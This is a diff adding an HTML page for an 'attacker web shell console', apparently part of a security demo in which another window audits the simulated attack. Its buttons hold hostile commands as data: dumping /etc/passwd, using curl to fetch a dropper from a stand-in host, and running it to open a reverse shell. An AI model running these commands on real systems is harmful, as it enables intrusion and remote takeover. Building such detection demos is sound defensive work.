@@ -1,0 +1,61 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Window 2: Attacker Web Shell Console</title>
+  <link rel="stylesheet" href="/static/css/cyber_theme.css">
+  <link rel="stylesheet" href="/static/css/terminal.css">
+</head>
+<body class="cyber-bg">
+  <header class="top-nav" style="border-bottom-color: #7f1d1d; background: #0c0a09;">
+    <div class="nav-title">
+      <span class="pulse-badge danger"></span>
+      <span style="color: #f87171;">[Window 2] Kali Linux Offensive Web Shell & Exploit Launcher</span>
+    </div>
+    <div style="color: #ef4444; font-size: 0.82rem; font-family: monospace;">
+      TARGET: http://victim-wsl2:5000/app | WEBSHELL CONNECTED
+    </div>
+  </header>
+
+  <div class="term-window">
+    <div class="term-header">
+      <div class="term-dots">
+        <span class="term-dot dot-red"></span>
+        <span class="term-dot dot-yellow"></span>
+        <span class="term-dot dot-green"></span>
+      </div>
+      <div class="term-title">bash - session #1 (198.51.100.42 &rarr; victim-wsl2)</div>
+      <div style="font-size:0.75rem; color:#ef4444; font-family:monospace;">ROOT PRIVILEGES PENDING</div>
+    </div>
+
+    <!-- Quick Action / Exploit Launcher Buttons -->
+    <div class="quick-bar">
+      <span style="font-size: 0.78rem; color: #64748b; font-family: monospace; margin-right: 4px;">EXPLOIT CHAIN:</span>
+      <button class="quick-btn" data-cmd="whoami && id && uname -a">[1] Recon (whoami / id)</button>
+      <button class="quick-btn" data-cmd="cat /etc/passwd">[2] Dump /etc/passwd</button>
+      <button class="quick-btn" data-cmd="curl -s http://198.51.100.42:8080/stage2.elf -o /tmp/stage2.elf">[3] Download Dropper</button>
+      <button class="quick-btn" data-cmd="chmod +x /tmp/stage2.elf && /tmp/stage2.elf --connect 198.51.100.42:4444">[4] PrivEsc & Reverse Shell</button>
+      <button class="quick-btn" data-cmd="RUN_FULL_CHAIN" style="background:#dc2626; color:#fff; border-color:#ef4444; font-weight:bold;">
+        &gt;&gt; RUN FULL KILL-CHAIN &lt;&lt;
+      </button>
+    </div>
+
+    <div class="term-body" id="terminalBody">
+      <div style="color: #64748b; margin-bottom: 12px; font-size: 0.82rem;">
+        [*] Connected to WSL2 Host WebShell via RCE Injection vector.<br>
+        [*] Ready to execute commands or trigger simulated exploit stages.<br>
+        [*] Provenance audit trail will be captured and evaluated in real-time by Window 3.
+      </div>
+    </div>
+
+    <div style="padding: 10px 16px; background: #0b0f14; border-top: 1px solid #1f2937;">
+      <div class="prompt-line">
+        <span class="prompt-prefix">attacker@victim-wsl2:~$</span>
+        <input type="text" id="cmdInput" class="cmd-input" placeholder="Type Linux command (e.g., whoami, cat /etc/passwd, curl ...) and press Enter" autofocus autocomplete="off">
+      </div>
+    </div>
+  </div>
+
+  <script src="/static/js/terminal.js"></script>
+</body>
+</html>
